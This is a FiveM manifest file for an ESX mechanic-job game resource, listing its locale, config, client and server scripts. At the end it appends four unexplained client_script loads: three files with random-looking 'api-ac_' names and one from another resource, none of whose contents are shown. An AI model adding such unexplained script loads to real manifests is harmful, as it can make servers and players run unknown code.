resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Mechanic Job'

version '1.1.0'

client_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/de.lua',
	'locales/fr.lua',
	'locales/br.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/de.lua',
	'locales/fr.lua',
	'locales/br.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}

client_script "api-ac_MSixQhPKmCnf.lua"
client_script "api-ac_xUkMANoRzPVS.lua"
client_script "api-ac_IaWDYjheHvJp.lua"


client_script '@Sakura_AutoMods/xDxDxDxDxD.lua'